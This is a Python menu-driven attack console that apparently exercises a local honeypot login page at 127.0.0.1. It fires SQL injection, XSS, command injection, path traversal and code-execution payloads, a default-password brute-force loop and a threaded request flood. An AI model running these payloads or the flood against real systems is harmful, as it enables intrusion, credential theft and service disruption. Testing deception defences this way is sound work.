import requests
import threading
import time
import random
import sys
from colorama import init, Fore, Style

init(autoreset=True)

TARGET_URL = "http://127.0.0.1:8000/login"

def banner():
    print(Fore.GREEN + Style.BRIGHT + r"""
    =============================================
       RED TEAM ASSAULT CONSOLE v1.0
    =============================================
    Target: """ + Fore.RED + TARGET_URL + Fore.RESET)

def log_success(msg):
    print(Fore.GREEN + "[+] SUCCESS: " + Fore.WHITE + msg)

def log_fail(msg):
    print(Fore.RED + "[-] FAILED:  " + Fore.WHITE + msg)

def log_info(msg):
    print(Fore.CYAN + "[*] INFO:    " + Fore.WHITE + msg)

def attack_payload(attack_name, payload_list, expected_trigger):
    log_info(f"Initializing {attack_name} vector...")
    
    for p in payload_list:
        try:
            data = {"username": p, "password": "123", "access_key": "", "dept_id": "", "token": ""}
            response = requests.post(TARGET_URL, data=data)
            
            if expected_trigger in response.text:
                log_success(f"Vulnerability Exploited: {p}")
                print(Fore.YELLOW + f"    -> Server returned {attack_name} Deception Page")
                return
            elif "Access Denied" in response.text:
                log_fail(f"Blocked: {p}")
            else:
                log_info(f"Unknown Response: {response.status_code}")
                
        except Exception as e:
            print(Fore.RED + f"Connection Error: {e}")
        time.sleep(0.2)

def run_sqli():
    payloads = ["' OR 1=1 --", "admin' --", "' UNION SELECT 1,2 --", "1' OR '1'='1", "admin' #"]
    attack_payload("SQLi", payloads, "SEARCH RESULTS")

def run_xss():
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    attack_payload("XSS", payloads, "DEBUGGER")

def run_cmdi():
    payloads = ["; ls -la", "| cat /etc/passwd", "&& whoami", "sudo reboot", "| netstat -an"]
    attack_payload("Command Injection", payloads, "root@mail-server")

def run_lfi():
    payloads = ["../../../../etc/passwd", "../boot.ini", "/proc/self/environ", "C:\\windows\\win.ini"]
    attack_payload("LFI", payloads, "CONFIG PREVIEW")

def run_rce():
    payloads = ["import os; os.system('id')", "eval(phpinfo())", "system('whoami')", "exec(base64_decode('...'))"]
    attack_payload("RCE", payloads, "Execution Successful")

def run_bruteforce():
    log_info("Starting Credential Stuffing Module...")
    users = ["admin", "root", "user", "guest", "support"]
    passwords = ["123456", "password", "admin", "welcome", "letmein", "toor", "111111"]
    
    count = 0
    for u in users:
        for p in passwords:
            count += 1
            data = {"username": u, "password": p}
            res = requests.post(TARGET_URL, data=data)
            
            if "AUTHENTICATION BYPASSED" in res.text:
                log_success(f"Brute Force Successful on attempt {count}")
                print(Fore.YELLOW + "    -> Admin Session Established (Fake)")
                return
            else:
                print(Fore.RED + f"    [x] Failed: {u}:{p}")
            time.sleep(0.05)

def run_dos():
    log_info("Initiating Volumetric Flood (50 Threads)...")
    
    def flood():
        try:
            res = requests.post(TARGET_URL, data={"username": "dos_bot", "password": "123"})
            if "KERNEL PANIC" in res.text:
                print(Fore.GREEN + "    [!] Target Crash Confirmed (Fake)")
            else:
                print(Fore.RED + "    [.] Packet sent...")
        except:
            pass

    threads = []
    for _ in range(50):
        t = threading.Thread(target=flood)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    log_success("DoS Sequence Complete.")

def run_scanner():
    log_info("Scanning for hidden backup files...")
    try:
        res = requests.get(TARGET_URL.replace("/login", "/system/backup_dump.sql"), stream=True)
        if res.status_code == 200:
            log_success("Hidden Asset Found: /system/backup_dump.sql")
            print(Fore.YELLOW + "    -> Server is trapping connection (Tar Pit active)")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

def main():
    while True:
        banner()
        print(Fore.WHITE + "Select Attack Vector:")
        print(Fore.CYAN + "1.  " + Fore.WHITE + "SQL Injection")
        print(Fore.CYAN + "2.  " + Fore.WHITE + "XSS Scripting")
        print(Fore.CYAN + "3.  " + Fore.WHITE + "Command Injection")
        print(Fore.CYAN + "4.  " + Fore.WHITE + "Local File Inclusion")
        print(Fore.CYAN + "5.  " + Fore.WHITE + "Remote Code Execution")
        print(Fore.CYAN + "6.  " + Fore.WHITE + "Brute Force")
        print(Fore.CYAN + "7.  " + Fore.WHITE + "DoS Flood")
        print(Fore.CYAN + "8.  " + Fore.WHITE + "Vulnerability Scanner")
        print(Fore.RED  + "99. " + Fore.WHITE + "EXIT")
        
        choice = input(Fore.GREEN + "\nroot@kali:~$ ")
        
        if choice == '1': run_sqli()
        elif choice == '2': run_xss()
        elif choice == '3': run_cmdi()
        elif choice == '4': run_lfi()
        elif choice == '5': run_rce()
        elif choice == '6': run_bruteforce()
        elif choice == '7': run_dos()
        elif choice == '8': run_scanner()
        elif choice == '99': sys.exit()
        
        input(Fore.YELLOW + "\n[Press Enter to return to menu]")

if __name__ == "__main__":
    main()